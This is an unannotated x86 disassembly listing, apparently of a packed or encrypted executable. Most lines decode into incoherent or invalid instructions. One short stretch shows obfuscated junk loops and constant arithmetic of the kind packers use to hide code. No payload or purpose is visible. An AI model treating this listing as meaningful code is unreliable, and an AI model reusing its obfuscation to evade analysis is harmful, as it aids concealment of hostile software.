  40a687:	fbld   TBYTE PTR [edx+0x3e2540f4]
  40a68d:	mov    al,0xe2
  40a68f:	cmp    ah,BYTE PTR [edi]
  40a691:	sub    eax,0x4b1d44b3
  40a696:	jo     0x40a62b
  40a698:	fdivrp st(2),st
  40a69a:	mov    dh,0x45
  40a69c:	and    DWORD PTR [ebx-0x5985cbf2],esp
  40a6a2:	test   BYTE PTR [edi-0x54f82ed3],cl
  40a6a8:	imul   edi,DWORD PTR [ebp+0x39a135da],0xd
  40a6af:	push   eax
  40a6b0:	test   BYTE PTR [eax+0x1a13c2c5],ch
  40a6b6:	hlt    
  40a6b7:	xor    BYTE PTR [esp+ebx*2-0x753a68a7],ch
  40a6be:	test   eax,0xf9ab7a5e
  40a6c3:	xor    ebx,DWORD PTR [esp+ecx*4-0x4]
  40a6c7:	out    dx,eax
  40a6c8:	ret    
  40a6c9:	lock push edx
  40a6cb:	mov    BYTE PTR [edi-0x74],ch
  40a6ce:	in     eax,dx
  40a6cf:	shl    al,0x8c
  40a6d2:	xlat   BYTE PTR ds:[ebx]
  40a6d3:	(bad)  
  40a6d4:	(bad)
  40a6d9:	mov    ?,ebx
  40a6db:	and    edi,DWORD PTR [esi+0x41bfb1c5]
  40a6e1:	je     0x40a68c
  40a6e3:	inc    eax
  40a6e4:	scas   al,BYTE PTR es:[edi]
  40a6e5:	sbb    ebx,DWORD PTR [ecx+ebx*4+0x400204b8]
  40a6ec:	xor    esi,edi
  40a6ee:	mov    edx,0xabb0d6f3
  40a6f3:	push   ds
  40a6f4:	sub    eax,0xab8c8ef5
  40a6f9:	mov    edx,0xcc095246
  40a6fe:	mov    al,0x1f
  40a700:	push   esp
  40a701:	or     cl,cl
  40a703:	xchg   esp,eax
  40a704:	fdivrp st(5),st
  40a706:	aaa    
  40a707:	ds mov gs,WORD PTR es:[edx-0x6aaf8f05]
  40a70f:	in     eax,dx
  40a710:	inc    esi
  40a711:	mov    al,0x8a
  40a713:	fadd   DWORD PTR [ecx]
  40a715:	sub    edx,DWORD PTR [ecx+eiz*1-0x2b7e949a]
  40a71c:	retf   0x4299
  40a71f:	fistp  QWORD PTR [eax]
  40a721:	call   0x393f2a32
  40a726:	pop    eax
  40a727:	cmp    DWORD PTR [ebp-0x23583da5],ebp
  40a72d:	and    ah,BYTE PTR [eax-0x36a1b42]
  40a733:	add    DWORD PTR ds:0x924c5f3b,esp
  40a739:	mov    eax,0x84db2b0e
  40a73e:	pusha  
  40a73f:	and    al,0x27
  40a741:	call   0x368a:0x886b4d17
  40a748:	shl    DWORD PTR [esi],0x97
  40a74b:	cmp    eax,0xec4a608c
  40a750:	sbb    bh,bl
  40a752:	jno    0x40a720
  40a754:	pop    esp
  40a755:	nop
  40a756:	xchg   edx,eax
  40a757:	cmc    
  40a758:	out    0x91,al
  40a75a:	mov    DWORD PTR [eax+esi*4+0xd137a34],ecx
  40a761:	call   0x943e:0x22c14b46
  40a768:	sahf   
  40a769:	mov    ds:0x8a46bbc4,al
  40a76e:	out    dx,eax
  40a76f:	cmp    DWORD PTR [edx+0xd],ecx
  40a772:	ins    BYTE PTR es:[edi],dx
  40a773:	jp     0x40a72e
  40a775:	call   0xc00a:0xe8b2929f
  40a77c:	sub    eax,0xf612fb6a
  40a781:	cmp    ch,BYTE PTR [ecx+0xb]
  40a784:	shl    esi,0xe8
  40a787:	inc    edi
  40a788:	pusha  
  40a789:	inc    esi
  40a78a:	test   DWORD PTR [ecx+0x78865629],esi
  40a790:	cs sub eax,0x7600164
  40a796:	shr    edi,1
  40a798:	push   cs
  40a799:	ja     0x40a7e9
  40a79b:	pop    es
  40a79c:	iret   
  40a79d:	scas   eax,DWORD PTR es:[edi]
  40a79e:	push   esp
  40a79f:	cld    
  40a7a0:	bound  ebp,QWORD PTR [ebp+0x11556d18]
  40a7a6:	inc    ecx
  40a7a7:	or     BYTE PTR [ebx+eiz*4],bl
  40a7aa:	(bad)  
  40a7ab:	push   ebx
  40a7ac:	(bad)  
  40a7ad:	or     dh,BYTE PTR [esi-0x6cd71276]
  40a7b3:	dec    esi
  40a7b4:	sub    DWORD PTR cs:[ebp-0x6ba2108d],edi
  40a7bb:	sbb    esp,0xa8e9722c
  40a7c1:	mov    esi,0xa97704d6
  40a7c6:	ins    DWORD PTR es:[edi],dx
  40a7c7:	rol    BYTE PTR [ebx-0x39af0693],cl
  40a7cd:	lods   eax,DWORD PTR ds:[esi]
  40a7ce:	jb     0x40a758
  40a7d0:	jp     0x40a76e
  40a7d2:	jae    0x40a767
  40a7d4:	xor    al,0x31
  40a7d6:	dec    edx
  40a7d7:	xor    DWORD PTR [ebp-0x34c91cb6],eax
  40a7dd:	fwait
  40a7de:	push   ebp
  40a7df:	fwait
  40a7e0:	mul    BYTE PTR [ecx-0x38b12006]
  40a7e6:	jl     0x40a808
  40a7e8:	mov    esp,0x92d89ec7
  40a7ed:	ds push esi
  40a7ef:	mov    bh,0x4a
  40a7f1:	je     0x40a7f4
  40a7f3:	ja     0x40a869
  40a7f5:	jp     0x40a77b
  40a7f7:	jno    0x40a83b
  40a7f9:	mov    ebp,ebx
  40a7fb:	push   esi
  40a7fc:	(bad)  
  40a7fd:	stc    
  40a7fe:	dec    edx
  40a7ff:	push   ecx
  40a800:	int3   
  40a801:	data16 out dx,al
  40a803:	test   eax,0x665fcf54
  40a808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a809:	(bad)  [ebx]
  40a80b:	sar    esi,0xd9
  40a80e:	repz cmc 
  40a810:	or     DWORD PTR [eax],0x88eefd79
  40a816:	lds    ebp,FWORD PTR [eax]
  40a818:	das    
  40a819:	xchg   ecx,eax
  40a81a:	xor    eax,0x34d9109a
  40a81f:	jmp    0x8b91:0xd8033fd3
  40a826:	loop   0x40a7f7
  40a828:	inc    edx
  40a829:	loop   0x40a82c
  40a82b:	in     eax,dx
  40a82c:	cli    
  40a82d:	loop   0x40a7e2
  40a82f:	mov    bh,0x1
  40a831:	mov    ds:0x6f838ce7,al
  40a836:	xor    al,BYTE PTR [edx+0x1b8c09e5]
  40a83c:	mov    ch,BYTE PTR [edi-0x4ecb3e29]
  40a842:	je     0x40a876
  40a844:	arpl   WORD PTR [ecx],dx
  40a846:	inc    edx
  40a847:	stc    
  40a848:	ret    0x3b7a
  40a84b:	aaa    
  40a84c:	fisub  WORD PTR [eax]
  40a84e:	jp     0x40a82d
  40a850:	in     eax,dx
  40a851:	stos   BYTE PTR es:[edi],al
  40a852:	fwait
  40a853:	jb     0x40a8c6
  40a855:	sub    BYTE PTR [edx-0x1d04f66c],ch
  40a85b:	xor    dl,BYTE PTR [ebx]
  40a85d:	mov    eax,0xe68e2ea5
  40a862:	(bad)  
  40a863:	scas   eax,DWORD PTR es:[edi]
  40a864:	xor    cl,bh
  40a866:	call   0x4df4636d
  40a86b:	addr16 iret 
  40a86d:	fsubr  DWORD PTR [edx+0x42]
  40a870:	popf   
  40a871:	iret   
  40a872:	stos   DWORD PTR es:[edi],eax
  40a873:	or     DWORD PTR [eax+ebx*8+0x57fb4f70],eax
  40a87a:	jns    0x40a85a
  40a87c:	div    ebx
  40a87e:	pop    edx
  40a87f:	jle    0x40a816
  40a881:	or     al,0x95
  40a883:	pop    esi
  40a884:	(bad)  
  40a886:	adc    BYTE PTR [edi+0x1b110f0c],bl
  40a88c:	cwde   
  40a88d:	mov    ds:0xa5f29fa4,eax
  40a892:	mov    al,ds:0xbcf38b56
  40a897:	pop    es
  40a898:	jg     0x40a8b1
  40a89a:	adc    eax,0x9332ccbf
  40a89f:	rcr    bl,1
  40a8a1:	mov    esp,0xd65695e2
  40a8a6:	repnz (bad) 
  40a8a8:	ss sbb esp,edi
  40a8ab:	pop    ebx
  40a8ac:	or     ch,bl
  40a8ae:	push   ebx
  40a8af:	arpl   WORD PTR ds:0x4c775de9,dx
  40a8b5:	ins    BYTE PTR es:[edi],dx
  40a8b6:	push   cs
  40a8b7:	sub    DWORD PTR [ebx+edi*8-0x1e692c2c],0x350daf97
  40a8c2:	xchg   DWORD PTR [esi+edx*2+0x7b],eax
  40a8c6:	adc    edi,ebp
  40a8c8:	data16 repnz mov al,0x5c
  40a8cc:	mov    ?,ecx
  40a8ce:	lock pop edi
  40a8d0:	or     al,0x7f
  40a8d2:	adc    dl,BYTE PTR [edi]
  40a8d4:	mov    esp,ebx
  40a8d6:	mov    ecx,0xf0c8a92d
  40a8db:	inc    bx
  40a8dd:	and    esp,DWORD PTR [eax]
  40a8df:	idiv   DWORD PTR [ecx+0x58808926]
  40a8e5:	mov    dl,bh
  40a8e7:	sub    eax,0x68c73271
  40a8ec:	loopne 0x40a90e
  40a8ee:	mov    ch,0x2d
  40a8f0:	js     0x40a875
  40a8f2:	xchg   esi,eax
  40a8f3:	sahf   
  40a8f4:	sahf   
  40a8f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8f6:	xchg   esp,eax
  40a8f7:	gs lahf 
  40a8f9:	call   0x78459384
  40a8fe:	jmp    0x96600810
  40a903:	mov    esp,0x557b66f5
  40a908:	push   esp
  40a909:	xor    DWORD PTR [edi],esi
  40a90b:	mov    edx,0xb362f020
  40a910:	arpl   WORD PTR [ecx+0x38],si
  40a913:	icebp  
  40a914:	enter  0xe7ff,0xa3
  40a918:	aam    0x9
  40a91a:	ss cdq 
  40a91c:	pop    esp
  40a91d:	lahf   
  40a91e:	pusha  
  40a91f:	mov    dl,0x23
  40a921:	pop    ds
  40a922:	jg     0x40a8c2
  40a924:	cmp    BYTE PTR [edx-0x732e0b80],bl
  40a92a:	out    dx,eax
  40a92b:	push   ebx
  40a92c:	mov    dh,bh
  40a92e:	push   ebx
  40a92f:	retf   
  40a930:	jb     0x40a8bb
  40a932:	mov    ebx,0x4e9edede
  40a937:	xor    al,0x4f
  40a939:	(bad)  
  40a93a:	into   
  40a93b:	push   esi
  40a93c:	mov    edx,DWORD PTR [esi]
  40a93e:	dec    edx
  40a93f:	loopne 0x40a940
  40a941:	loop   0x40a938
  40a943:	mov    edx,0x8d7f0901
  40a948:	jge    0x40a991
  40a94a:	fs cmp eax,0xa001783b
  40a950:	loopne 0x40a965
  40a952:	dec    esp
  40a953:	in     eax,dx
  40a954:	mov    ecx,0xf35fbc6f
  40a959:	imul   ecx,ebx,0xffffff8e
  40a95c:	sahf   
  40a95d:	test   edi,edx
  40a95f:	or     eax,0xaf723ae6
  40a964:	mov    ecx,DWORD PTR [ecx+0x74]
  40a967:	sbb    al,0xcd
  40a969:	xchg   edx,eax
  40a96a:	push   eax
  40a96b:	sub    eax,DWORD PTR [eax+0x48]
  40a96e:	pop    ecx
  40a96f:	xchg   esi,eax
  40a970:	faddp  st(2),st
  40a972:	fcmove st,st(5)
  40a974:	inc    ebx
  40a975:	cdq    
  40a976:	mov    cl,0x80
  40a978:	arpl   WORD PTR [ecx-0x28dc3ac2],ax
  40a97e:	mov    edx,0xc2978ac7
  40a983:	sbb    dh,BYTE PTR [eax]
  40a985:	jecxz  0x40a9a2
  40a987:	xchg   DWORD PTR [eax],edi
  40a989:	dec    eax
  40a98a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a98b:	jecxz  0x40a981
  40a98d:	call   0x570c365f
  40a992:	or     DWORD PTR ds:0x428e7f,0x7ae1
  40a99c:	mov    esi,0x75108af
  40a9a1:	xor    eax,esi
  40a9a3:	push   edi
  40a9a4:	and    edi,0x47d2
  40a9aa:	mov    edi,0x3272f6
  40a9af:	and    DWORD PTR ds:0x428e57,0xe9
  40a9b9:	add    eax,edi
  40a9bb:	mov    DWORD PTR [ebp-0x1c],eax
  40a9be:	mov    eax,DWORD PTR [ebp+0x14]
  40a9c1:	adc    DWORD PTR ds:0x428e97,0x7644
  40a9cb:	test   eax,eax
  40a9cd:	je     0x40aa21
  40a9d3:	and    DWORD PTR ds:0x428e83,0x0
  40a9dd:	mov    eax,ds:0x428e83
  40a9e2:	inc    eax
  40a9e3:	mov    ds:0x428e83,eax
  40a9e8:	cmp    DWORD PTR ds:0x428e83,0x1e
  40a9ef:	jl     0x40aa18
  40a9f5:	jmp    0x40aa0b
  40a9fa:	push   DWORD PTR [ebp-0x24]
  40a9fd:	push   0x428e43
  40aa02:	push   DWORD PTR [ebp-0x10]
  40aa05:	call   DWORD PTR ds:0x42aa3f
  40aa0b:	cmp    DWORD PTR ds:0x428e83,0x17
  40aa12:	jb     0x40a9dd
  40aa18:	mov    eax,DWORD PTR [ebp+0x14]
  40aa1b:	mov    eax,DWORD PTR [eax]
  40aa1d:	dec    ebx
  40aa1e:	mov    DWORD PTR [ebp-0x1c],eax
  40aa21:	mov    eax,DWORD PTR [ebp-0x4]
  40aa24:	xor    DWORD PTR ds:0x428e2b,0x506a
  40aa2e:	xor    eax,esi
  40aa30:	and    DWORD PTR ds:0x428e7f,edi
  40aa36:	add    eax,edi
  40aa38:	mov    DWORD PTR [ebp-0x8],eax
  40aa3b:	mov    DWORD PTR ds:0x428e97,0x1e
  40aa45:	cmp    DWORD PTR ds:0x428e97,0x0
  40aa4c:	je     0x40aa81
  40aa52:	cmp    DWORD PTR ds:0x428e97,0x20
  40aa59:	jg     0x40aa81
  40aa5f:	jmp    0x40aa6f
  40aa64:	push   0x4281a7
  40aa69:	call   DWORD PTR ds:0x42aa0b
  40aa6f:	mov    ebx,DWORD PTR ds:0x428e97
  40aa75:	dec    ebx
  40aa76:	mov    DWORD PTR ds:0x428e97,ebx
  40aa7c:	jmp    0x40aa45
  40aa81:	mov    eax,DWORD PTR [ebp-0xc]
  40aa84:	add    DWORD PTR ds:0x428eaf,edx
  40aa8a:	xor    eax,esi
  40aa8c:	add    eax,edi
  40aa8e:	mov    ebx,DWORD PTR ds:0x429bcb
  40aa94:	mov    ebx,DWORD PTR [ebx]
  40aa96:	or     DWORD PTR ds:0x428ebb,ebx
  40aa9c:	mov    DWORD PTR [ebp-0x24],eax
  40aa9f:	and    DWORD PTR ds:0x428e27,0x0
  40aaa9:	jmp    0x40aabb
  40aaae:	mov    ebx,DWORD PTR ds:0x428e27
  40aab4:	inc    ebx
  40aab5:	mov    DWORD PTR ds:0x428e27,ebx
  40aabb:	cmp    DWORD PTR ds:0x428e27,0x13
  40aac2:	jae    0x40ce99
  40aac8:	cmp    DWORD PTR ds:0x428e27,0x18
  40aacf:	jle    0x40ce99
  40aad5:	jmp    0x40aae5
  40aada:	push   0x428173
  40aadf:	call   DWORD PTR ds:0x42aa0f
  40aae5:	jmp    0x40aaae
  40aaea:	jmp    0x40ce99
  40aaef:	dec    edx
  40aaf0:	shr    ah,1
  40aaf2:	shl    esp,0x9d
  40aaf5:	push   es
  40aaf6:	mov    bl,dl
  40aaf8:	adc    BYTE PTR [edx+0x6f],bh
  40aafb:	xchg   ebx,eax
  40aafc:	jl     0x40ab52
  40aafe:	iret   
  40aaff:	out    0xf6,eax
  40ab01:	add    DWORD PTR [ebx-0x7c7c9f0f],0xffffffc1
  40ab08:	and    bh,BYTE PTR [edx+0x5e]
  40ab0b:	in     eax,dx
  40ab0c:	push   ds
  40ab0d:	out    0xa8,eax
  40ab0f:	or     edx,esp
  40ab11:	push   es
  40ab12:	mov    BYTE PTR [edi+0x4b],bl
  40ab15:	aad    0xa2
  40ab17:	stos   BYTE PTR es:[edi],al
  40ab18:	(bad)  
  40ab1a:	rcl    DWORD PTR [edi],1
  40ab1c:	and    al,0x76
  40ab1e:	loopne 0x40aabb
  40ab20:	ret    
  40ab21:	jbe    0x40aae7
  40ab23:	stc    
  40ab24:	(bad)  
  40ab25:	icebp  
  40ab26:	into   
  40ab27:	into   
  40ab28:	xchg   DWORD PTR [edx+0x2e],ecx
  40ab2b:	or     DWORD PTR [esi-0x374cf31a],esp
  40ab31:	cmp    eax,0x238f7381
  40ab36:	mov    dh,0x71
  40ab38:	jns    0x40aabc
  40ab3a:	sub    BYTE PTR [edi+0x468e538a],bl
  40ab40:	out    0xa5,eax
  40ab42:	lahf   
  40ab43:	ja     0x40abc1
  40ab45:	inc    ebx
  40ab46:	inc    DWORD PTR [ebx+0x32]
  40ab49:	sbb    BYTE PTR [ebp+0x56920628],bh
  40ab4f:	pop    esi
  40ab50:	fdiv   QWORD PTR [ebp+0x64341d01]
  40ab56:	stc    
  40ab57:	add    eax,0xc511b18a
  40ab5c:	in     al,0xc0
  40ab5e:	jmp    0x40abdb
  40ab60:	xor    eax,0xa62575e0
  40ab65:	sbb    BYTE PTR [esi+0x36],0xf4
  40ab69:	aas    
  40ab6a:	enter  0xc26e,0xb2
  40ab6e:	xor    al,BYTE PTR [ecx+0x28]
  40ab71:	in     al,dx
  40ab72:	jl     0x40ab26
  40ab74:	sbb    BYTE PTR gs:[esi-0x55dcb173],bh
  40ab7b:	ret    0x82f2
  40ab7e:	pop    ebx
  40ab7f:	xlat   BYTE PTR ds:[ebx]
  40ab80:	ret    0xa497
  40ab83:	cmp    ebp,DWORD PTR [edi-0x29]
  40ab86:	add    bh,BYTE PTR [esi-0x36]
  40ab89:	imul   ebx,DWORD PTR [ebp+0x50],0x56
  40ab8d:	push   ds
  40ab8e:	xchg   esi,eax
  40ab8f:	dec    ebx
  40ab90:	inc    ebp
  40ab91:	lods   eax,DWORD PTR ds:[esi]
  40ab92:	scas   eax,DWORD PTR es:[edi]
  40ab93:	cmp    dl,BYTE PTR [esi-0x31]
  40ab96:	mov    al,0x19
  40ab98:	daa    
  40ab99:	out    dx,al
  40ab9a:	jnp    0x40ab77
  40ab9c:	dec    esp
  40ab9d:	mov    ebx,0x541559cf
  40aba2:	(bad)  
  40aba3:	mov    bl,0x78
  40aba5:	cmc    
  40aba6:	out    0xf2,al
  40aba8:	pop    edi
  40aba9:	inc    esi
  40abaa:	push   edi
  40abab:	jp     0x40abcd
  40abad:	neg    BYTE PTR [edi+0x1dc5c12b]
  40abb3:	movd   mm5,DWORD PTR [edi+0x6174aa98]
  40abba:	push   cs
  40abbb:	dec    ebx
  40abbc:	mov    esp,0x7e5a8ce
  40abc1:	cwde   
  40abc2:	cdq    
  40abc3:	in     al,0xc7
  40abc5:	cli    
  40abc6:	dec    esp
  40abc7:	inc    edi
  40abc8:	test   eax,0x4c35326c
  40abcd:	popa   
  40abce:	fsubr  QWORD PTR [ebp+0x16897a7a]
  40abd4:	lea    ecx,[ecx*1+0x18860197]
  40abdb:	mov    ebp,DWORD PTR [edx-0x77ab7826]
  40abe1:	inc    ebx
  40abe2:	mov    esp,0x31b5b415
  40abe7:	popf   
  40abe8:	or     al,0xc4
  40abea:	ficom  DWORD PTR [ecx+eax*2-0x47]
  40abee:	ror    BYTE PTR [di-0x3f],0xef
  40abf3:	dec    edx
  40abf4:	xor    al,BYTE PTR [ebx+ebp*2+0x7b]
  40abf8:	imul   esi,ebx,0xffffff9f
  40abfb:	(bad)  
  40abfc:	sub    edx,DWORD PTR [eax+ebx*4]
  40abff:	test   DWORD PTR [edi-0x1b],ebp
  40ac02:	dec    eax
  40ac03:	pop    ebp
  40ac04:	or     edx,DWORD PTR [ebx+ecx*2-0x51]
  40ac08:	pop    eax
  40ac09:	xor    DWORD PTR [ebx],0x60
  40ac0c:	and    eax,0x263c4f0f
  40ac11:	das    
  40ac12:	ret    
  40ac13:	lods   eax,DWORD PTR ds:[esi]
  40ac14:	cmp    bh,BYTE PTR [eax+ebx*4-0x29]
  40ac18:	sbb    BYTE PTR [eax+0x73],ch
  40ac1b:	dec    esp
  40ac1c:	xchg   edx,eax
  40ac1d:	push   es
  40ac1e:	aam    0xc4
  40ac20:	adc    al,0x7d
  40ac22:	aad    0x7e
  40ac24:	cmp    ah,BYTE PTR [esi+0x7f]
  40ac27:	dec    edx
  40ac28:	pop    ecx
  40ac29:	adc    bh,BYTE PTR [ebx+0x69]
  40ac2c:	or     eax,0x7c643a14
  40ac31:	jns    0x40abdb
  40ac33:	adc    al,0x87
  40ac35:	jmp    0x30366fea
  40ac3a:	push   ss
  40ac3b:	aaa    
  40ac3c:	dec    esp
  40ac3d:	cmp    bl,ch
  40ac3f:	(bad)  
  40ac40:	shl    bl,cl
  40ac42:	mov    edx,0x7a38fc3f
  40ac47:	mov    esi,0xe1b42054
  40ac4c:	gs sti 
  40ac4e:	xor    eax,0x487155a0
  40ac53:	cwde   
  40ac54:	and    DWORD PTR [esp+esi*1],ecx
  40ac57:	std    
  40ac58:	rol    ebx,0xc2
  40ac5b:	and    cl,al
  40ac5d:	repz or BYTE PTR [edx-0x26],al
  40ac61:	mov    al,0xd
  40ac63:	aad    0x66
  40ac65:	adc    eax,0xb3f87917
  40ac6a:	pop    ecx
  40ac6b:	add    BYTE PTR [ecx],dh
  40ac6d:	arpl   WORD PTR [eax-0x3a],cx
  40ac70:	xchg   BYTE PTR [edi],bl
  40ac72:	jmp    0x4f906f47
  40ac77:	arpl   bp,cx
  40ac79:	pushf  
  40ac7a:	xchg   edx,eax
  40ac7b:	into   
  40ac7c:	adc    BYTE PTR [ebx],bl
  40ac7e:	js     0x40ac31
  40ac80:	lock retf 
  40ac82:	shl    BYTE PTR [eax+0x78],1
  40ac85:	test   al,0xc0
  40ac87:	xor    eax,DWORD PTR [esi]
  40ac89:	push   cs
  40ac8a:	mov    ch,0x21
  40ac8c:	ins    DWORD PTR es:[edi],dx
  40ac8d:	mov    ebp,eax
  40ac8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac90:	inc    ebp
  40ac91:	xor    al,0xcc
  40ac93:	push   cs
  40ac94:	mov    WORD PTR [ebx-0x7dff77c3],?
  40ac9a:	sbb    eax,0x2ae2ad5
  40ac9f:	inc    ebx
  40aca0:	scas   al,BYTE PTR es:[edi]
  40aca1:	std    
  40aca2:	stos   DWORD PTR es:[edi],eax
  40aca3:	and    al,0xdc
  40aca5:	imul   esp,edi,0x6
  40aca8:	loop   0x40ac2c
  40acaa:	mov    dl,ah
  40acac:	inc    ebp
  40acae:	fmul   DWORD PTR [ebp-0x2aedd64a]
  40acb4:	in     al,0x39
  40acb6:	cmp    ah,0x87
  40acb9:	adc    DWORD PTR [ebp+0x764792d],esi
  40acbf:	mov    gs,WORD PTR [eax+0x7c15d4d1]
  40acc5:	icebp  
  40acc6:	data16 xor BYTE PTR [esi],bh
  40acc9:	aaa    
  40acca:	mov    edi,0xb0f61aaf
  40accf:	and    dl,BYTE PTR [esi]
  40acd1:	data16 sub al,0x6f
  40acd4:	fild   DWORD PTR [eax+ecx*4]
  40acd7:	push   0xffffff88
  40acd9:	leave  
  40acda:	mov    bl,0x2a
  40acdc:	xchg   esp,eax
  40acdd:	mov    bl,BYTE PTR [ebx-0x2e]
  40ace0:	popf   
  40ace1:	inc    esp
  40ace2:	sbb    esp,DWORD PTR [esp+ebp*2+0x24]
  40ace6:	pop    ebp
  40ace7:	jmp    0xf17f:0x6a33c844
  40acee:	fwait
  40acef:	mov    DWORD PTR [ebx+0x2d84d291],ebp
  40acf5:	ins    BYTE PTR es:[edi],dx
  40acf6:	pop    edx
  40acf7:	inc    esi
  40acf8:	add    cl,BYTE PTR [eax]
  40acfa:	push   ebp
  40acfb:	ret    
  40acfc:	jae    0x40ad09
  40acfe:	mov    edi,0x5bdca226
  40ad03:	sub    al,0x5d
  40ad05:	in     al,0x67
  40ad07:	test   DWORD PTR [ebx+0x4d93d0fc],esi
  40ad0d:	mov    bh,0x1e
  40ad0f:	and    DWORD PTR [eax-0x3d38a819],ecx
  40ad15:	push   esi
  40ad16:	mov    ecx,0x84843e6e
  40ad1b:	xchg   edx,eax
  40ad1c:	jno    0x40ad07
  40ad1e:	inc    edx
  40ad1f:	iret   
  40ad20:	inc    edi
  40ad21:	int    0xda
  40ad23:	lea    eax,[ebx+0x12c605c9]
  40ad29:	outs   dx,BYTE PTR ds:[esi]
  40ad2a:	pop    edx
  40ad2b:	outs   dx,DWORD PTR ds:[esi]
  40ad2c:	sbb    al,0x33
  40ad2e:	sub    dl,BYTE PTR [ecx]
  40ad30:	lods   al,BYTE PTR ds:[esi]
  40ad31:	loop   0x40ad69
  40ad33:	pop    es
  40ad34:	cwde   
  40ad35:	mov    DWORD PTR [edi+0x6b],ecx
  40ad38:	in     al,dx
  40ad39:	sub    al,0x62
  40ad3b:	and    DWORD PTR [edx+0x6c],edi
  40ad3e:	xchg   ebx,eax
  40ad3f:	loopne 0x40acdf
  40ad41:	bound  eax,QWORD PTR [ecx+eiz*4]
  40ad44:	fidivr DWORD PTR fs:[edi-0x35]
  40ad48:	push   eax
  40ad49:	loope  0x40acf8
  40ad4b:	imul   ebx,esi,0xffffffd1
  40ad4e:	leave  
  40ad4f:	mov    eax,ds:0xd4b1abaf
  40ad54:	pushf  
  40ad55:	dec    ebp
  40ad56:	dec    ebx
  40ad57:	scas   al,BYTE PTR es:[edi]
  40ad58:	xor    al,0x2e
  40ad5a:	jns    0x40ad93
  40ad5c:	out    0x33,al
  40ad5e:	shl    DWORD PTR cs:[esi-0x3fccb9c],0x6f
  40ad66:	mov    al,es:0x585488bd
  40ad6c:	mov    edx,0x3aa4ee6c
  40ad71:	fidiv  DWORD PTR [esi+eax*4]
  40ad74:	dec    ecx
  40ad75:	push   0xffffffe8
  40ad77:	push   edi
  40ad78:	retf   0x24f1
  40ad7b:	dec    edx
  40ad7c:	call   0xd737bf7b
  40ad81:	xchg   esp,eax
  40ad82:	cmp    ebx,DWORD PTR [esi-0x40]
  40ad85:	sar    ebp,cl
  40ad87:	(bad)  ds:0xe9997f27
  40ad8d:	adc    BYTE PTR [ecx+ecx*2+0x14f9043],0x28
  40ad95:	cli    
  40ad96:	cdq    
  40ad97:	or     DWORD PTR [esi],ebp
  40ad99:	call   0xe980:0xf692319e
  40ada0:	sub    dh,bl
  40ada2:	xor    ebp,edx
  40ada4:	lahf   
  40ada5:	ins    BYTE PTR es:[edi],dx
  40ada6:	xchg   edx,eax
  40ada7:	test   DWORD PTR [ebp-0x7c6e942b],edi
  40adad:	add    esp,DWORD PTR [eax-0x72e5e9cf]
  40adb3:	mov    ch,0xcd
  40adb5:	adc    ebx,0x44
  40adb8:	mov    ch,0xa4
  40adba:	int    0xc3
  40adbc:	push   ebp
  40adbd:	sbb    eax,0x2a0c4d75
  40adc2:	loopne 0x40ad45
  40adc4:	fs ss aas 
  40adc7:	xchg   ebp,eax
  40adc8:	repz in eax,dx
  40adca:	in     eax,0x0
  40adcc:	dec    esi
  40adcd:	imul   ebx,DWORD PTR [edi+0x8],0x61c90c02
  40add4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add5:	mov    eax,0xbafe98fa
  40adda:	pop    ecx
  40addb:	inc    ebx
  40addc:	in     eax,dx
  40addd:	xlat   BYTE PTR ds:[ebx]
  40adde:	(bad)  
  40addf:	push   dx
  40ade1:	retf   
  40ade2:	adc    esp,DWORD PTR [edi]
  40ade4:	cmp    eax,0x9c2662f5
  40ade9:	lea    sp,[ebp-0x7c]
  40aded:	adc    edx,DWORD PTR [edx]
  40adef:	push   ds
  40adf0:	aad    0x26
  40adf2:	jl     0x40aded
  40adf4:	scas   al,BYTE PTR es:[edi]
  40adf5:	aam    0x60
  40adf7:	pop    ecx
  40adf8:	mov    ds:0xf7fa64c3,eax
  40adfd:	mov    edi,0xa3f7aa8d
  40ae02:	or     DWORD PTR [esi+0x5de95b45],eax
  40ae08:	xor    edi,ebp
  40ae0a:	leave  
  40ae0b:	dec    ebp
  40ae0c:	sub    eax,0xec6f61e8
  40ae11:	push   ebp
  40ae12:	int    0xe6
  40ae14:	add    al,ch
  40ae16:	mov    bl,0xe2
  40ae18:	imul   DWORD PTR [ecx-0x3f]
  40ae1b:	pop    edi
  40ae1c:	jo     0x40ae65
  40ae1e:	mov    ah,0x85
  40ae20:	cld    
  40ae21:	inc    ebp
  40ae22:	bnd jnp 0x40adcd
  40ae25:	push   ss
  40ae26:	js     0x40adf2
  40ae28:	ret    0x3c06
  40ae2b:	push   edx
  40ae2c:	daa    
  40ae2d:	inc    edi
  40ae2e:	inc    esp
  40ae2f:	aad    0x37
  40ae31:	sti    
  40ae32:	mov    bh,0x39
  40ae34:	scas   eax,DWORD PTR es:[edi]
  40ae35:	cmp    DWORD PTR [ebx],eax
  40ae37:	lods   eax,DWORD PTR ds:[esi]
  40ae38:	sbb    eax,DWORD PTR [edi-0x4e]
  40ae3b:	push   eax
  40ae3c:	hlt    
  40ae3d:	cwde   
  40ae3e:	(bad)  
  40ae40:	out    0x6a,eax
  40ae42:	inc    edi
  40ae43:	sbb    eax,esi
  40ae45:	inc    ebp
  40ae46:	mov    edx,0x6103c682
  40ae4b:	add    ecx,ecx
  40ae4d:	pop    ecx
  40ae4e:	push   ecx
  40ae4f:	mov    si,WORD PTR [ecx]
  40ae52:	jp     0x40ae3c
  40ae54:	jg     0x40ae17
  40ae56:	jge    0x40aebc
  40ae58:	stos   BYTE PTR es:[edi],al
  40ae59:	ja     0x40ae58
  40ae5b:	fadd   DWORD PTR [ebp-0x4d]
  40ae5e:	retf   0xc1a5
  40ae61:	(bad)  
  40ae62:	sti    
  40ae63:	ficomp DWORD PTR [eax-0x16b5361]
  40ae69:	inc    edx
  40ae6a:	mov    eax,ds:0x473f982b
  40ae6f:	adc    ebx,DWORD PTR [ebx+0x1a]
  40ae72:	cmp    DWORD PTR [eax+edi*1+0x39],ecx
  40ae76:	cld    
  40ae77:	adc    eax,0xad9b4a33
  40ae7c:	sbb    edx,esi
  40ae7e:	enter  0x2bb,0xad
  40ae82:	leave  
  40ae83:	adc    BYTE PTR [edi+0x22],bh
  40ae86:	xchg   ebp,eax
  40ae87:	cld    
  40ae88:	lahf   
  40ae89:	in     eax,dx
  40ae8a:	inc    edi
  40ae8b:	ss cdq 
  40ae8d:	ret    
  40ae8e:	push   ebx
  40ae8f:	inc    esp
  40ae90:	jl     0x40ae2a
